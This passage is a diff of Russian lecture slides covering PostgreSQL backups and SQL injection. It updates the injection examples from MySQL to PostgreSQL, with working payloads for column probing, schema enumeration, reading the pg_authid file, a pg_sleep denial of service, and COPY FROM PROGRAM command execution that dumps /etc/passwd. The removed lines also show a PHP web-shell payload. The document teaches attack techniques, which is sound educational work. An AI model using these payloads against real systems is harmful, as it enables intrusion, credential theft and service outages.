@@ -106,7 +106,8 @@ useMath: true
             невозмонжо восстановление на другой версии PostgreSQL.
         </li>
         <li>Физические резервные копии не проверяют целостность данных: если резервная копия была снята с битых данных,
-            то вы получение битые данные.</li>
+            то вы получение битые данные.
+        </li>
     </ul>
 </section>
 
@@ -134,13 +135,13 @@ useMath: true
 </section>
 
 <section class="slide">
-LVM
-btrfs
-pg_basebackup
-pg_dump
-pg_dumpall
-pg_restore
-pg_upgradecluster
+    LVM
+    btrfs
+    pg_basebackup
+    pg_dump
+    pg_dumpall
+    pg_restore
+    pg_upgradecluster
 </section>
 
 <section class="slide">
@@ -841,12 +842,14 @@ START SLAVE;
         <li>http://xxx/news.php?id=1'
             <pre><code class="sql">SELECT * FROM news WHERE id='<mark>1'</mark>'
 </code></pre>
-            mysql_query(): You have an error in your SQL syntax check the manual that corresponds to your MySQL server version for the right syntax to use near '1''
+            <pre><code>pg_query(): Query failed: ERROR: unterminated quoted…
+</code></pre>
         </li>
         <li>http://xxx/news.php?id=1'%20--%20
             <pre><code class="sql">SELECT * FROM news WHERE id='<mark>1' -- </mark>'
 </code></pre>
         </li>
+    </ul>
 </section>
 
 <section class="slide">
@@ -858,9 +861,7 @@ WHERE login='<mark>$login</mark>' AND pass='<mark>$pass</mark>'</code></pre>
 SELECT * FROM users
 WHERE login='<mark>Admin' -- </mark>' AND pass='<mark>123</mark>'
 </code></pre>
-        <pre><code class="sql">
-
-  
+        <pre><code class="sql">  
 SELECT * FROM users
 WHERE login='<mark>Admin</mark>' AND pass='<mark>123' OR login='Admin' -- </mark>'
 </code></pre>
@@ -872,71 +873,80 @@ WHERE (login='Admin' AND pass='123') OR (login='Admin')
 </section>
 
 <section class="slide">
-    <h2>Оператор LIKE</h2>
-    <pre><code class="sql">SELECT * FROM users
-WHERE login LIKE 'Admin' AND pass LIKE '123'
-</code></pre>
-    <pre><code class="sql">
-SELECT * FROM users
-WHERE login LIKE 'Admin' AND pass LIKE '%'
-</code></pre>
-</section>
-
-<section class="slide">
     <h2>SQL-injection: UNION</h2>
     <ul>
-        <li>http://xxx/news.php?id=1' UNION SELECT 1, 2 --
-            <pre><code class="sql">SELECT * FROM news WHERE id='1' UNION SELECT 1 --</code></pre>
-            Ошибка. «The used SELECT statements have a different number of columns»</li>
+        <li><code>http://xxx/news.php?id=1' UNION SELECT null --</code>
+            <pre><code class="sql">SELECT * FROM news WHERE id='<mark>1' UNION SELECT null --</mark>'</code></pre>
+            <code>pg_query(): Query failed: ERROR: each UNION query must have the same number of columns</code></li>
 
-        <li>http://xxx/news.php?id=1' UNION SELECT 1, 2 --<br/>
-            Ошибка. «The used SELECT statements have a different number of columns»</li>
-
-        <li>http://xxx/news.php?id=1' UNION SELECT 1,2,3 --<br/>
-            Опять ошибка.</li>
-
-        <li>http://xxx/news.php?id=1' UNION SELECT 1,2,3,4,5,6 --<br/>
-            О! Отобразилось точно также как и http://xxx/news.php?id=1</li>
+        <li><code>http://xxx/news.php?id=1' UNION SELECT null, null --</code><br/>
+            О! Отобразилось точно также как и <code>http://xxx/news.php?id=1</code></li>
     </ul>
 </section>
 
 <section class="slide">
     <h2>SQL-injection: GROUP BY/ORDER BY</h2>
     <ul>
-        <li>http://xxx/news.php?id=1' GROUP BY 2 --</li>
-        <li>http://xxx/news.php?id=1' GROUP BY 10 --<br/>
-            mysql_query(): Unknown column '10' in 'group statement'</li>
-        <li>http://xxx/news.php?id=1' GROUP BY 5 --</li>
-        <li>http://xxx/news.php?id=1' GROUP BY 7 --<br/>
-            mysql_query(): Unknown column '7' in 'group statement'</li>
-        <li>http://xxx/news.php?id=1' GROUP BY 6 --</li>
+        <li>http://xxx/news.php?id=1' GROUP BY 1, 2, 3, 4 --</li>
+        <pre><code class="sql">SELECT title, body FROM news WHERE id='<mark>1'
+GROUP BY 1, 2, 3, 4 --</mark>'</code></pre>
+        <pre><code>pg_query(): Query failed: ERROR: GROUP BY position 3</code></pre>
+        </li>
+
+        <li>http://xxx/news.php?id=1' ORDER BY 4 --</li>
+        <pre><code class="sql">SELECT title, body FROM news WHERE id='<mark>1'
+ORDER BY 4 --</mark>'</code></pre>
+        <pre><code>pg_query(): Query failed: ERROR: ORDER BY position 4</code></pre>
+        </li>
+
+        <li><code>http://xxx/news.php?id=1' GROUP BY 1, 2</code><br/>
+            <code>http://xxx/news.php?id=1' ORDER BY 2</code><br/>
+            О! Отобразилось точно также как и <code>http://xxx/news.php?id=1</code></li>
     </ul>
 </section>
 
 <section class="slide">
     <h2>SQL-injection: INFORMATION_SCHEMA</h2>
-    <ul style="font-size: 90%">
-        <li>http://xxx/news.php?id=-1' UNION SELECT 1,2,3,TABLE_NAME ,5,6 FROM INFORMATION_SCHEMA.TABLES --</li>
-        <li>http://xxx/news.php?id=-1' UNION SELECT 1,2,3,TABLE_NAME ,5,6 FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1 --</li>
-        <li>http://xxx/news.php?id=-1' UNION SELECT 1,2,3, COLUMN_NAME,5,6 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=’Users’ LIMIT 0,1 --</li>
-        <li>http://xxx/news.php?id=-1' UNION SELECT 1,2,3, COLUMN_NAME,5,6 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='Users' LIMIT 1,1 --</li>
+    <ul>
+        <li><code>http://xxx/news.php?id=-1' UNION SELECT table_schema, table_name FROM information_schema.tables
+            --</code>
+            <pre><code class="sql">SELECT title, body FROM news WHERE id='<mark>-1'
+UNION
+SELECT table_schema, table_name
+FROM information_schema.tables --</mark>'</code></pre>
+        </li>
     </ul>
 </section>
 
 <section class="slide">
     <h2>SQL-injection: Работа с файлами</h2>
-    <ul style="font-size: 90%">
-        <li>http://xxx/news.php?id=-1' UNION SELECT 1,2,3,4,5,6 INTO OUTFILE '1.txt' --</li>
-        <li>http://xxx/news.php?id=-1' UNION SELECT 1,2,3,'<?php eval($_GET[‘e’]) ?>',5,6 INTO OUTFILE '1.php' --</li>
-        <li>http://xxx/news.php?id=-1' UNION SELECT 1,2,LOAD_FILE('etc/passwd'),4,5,6</li>
+    <ul>
+        <li><code>http://xxx/news.php?id=-1' UNION SELECT '.', pg_ls_dir('.') --</code></li>
+        <li><code>http://xxx/news.php?id=-1' UNION SELECT 'pg_catalog.pg_authid', encode(<wbr/>pg_read_binary_file(<wbr/>pg_relation_filepath(<wbr/>'pg_catalog.pg_authid')), 'hex') --</code></li>
     </ul>
 </section>
 
 <section class="slide">
     <h2>SQL-injection: DOS ататка</h2>
-    <pre><code class="sql" style="font-size: 90%">SELECT BENCHMARK(100000,md5(current_time));
+    <ul>
+        <li><code>http://xxx/news.php?id=-1' UNION SELECT NULL, pg_sleep(3600) --</code><br/>
+            <pre><code class="sql">SELECT title, body FROM news WHERE id='<mark>-1'
+UNION SELECT NULL, pg_sleep(3600) --</mark>'</code></pre>
+        </li>
+    </ul>
+</section>
 
-SELECT BENCHMARK(100000,BENCHMARK(100000,md5(current_time)));
-</code></pre>
-    <p>http://xxx/news.php?id=-1' UNION SELECT 1, 2, BENCHMARK(100000,BENCHMARK(100000,md5(current_time ))), 4, 5, 6 --</p>
+<section class="slide">
+    <h2>SQL-injection: Fatality</h2>
+    <ul>
+        <li><code>http://xxx/news.php?id=-1'; CREATE TEMP TABLE tmp1 (content text); COPY tmp1 FROM PROGRAM 'cat /etc/passwd'; UPDATE news SET body = (SELECT string_agg(content, E'\n') FROM tmp1) WHERE id = 1; --</code><br/>
+            <pre><code class="sql">SELECT title, body FROM news WHERE id='<mark>-1';
+CREATE TEMP TABLE tmp1 (content text);
+COPY tmp1 FROM PROGRAM 'cat /etc/passwd';
+UPDATE news SET body = (
+    SELECT string_agg(content, E'\n') FROM tmp1
+) WHERE id = 1;
+--</mark>'</code></pre>
+        </li>
+    </ul>
 </section>
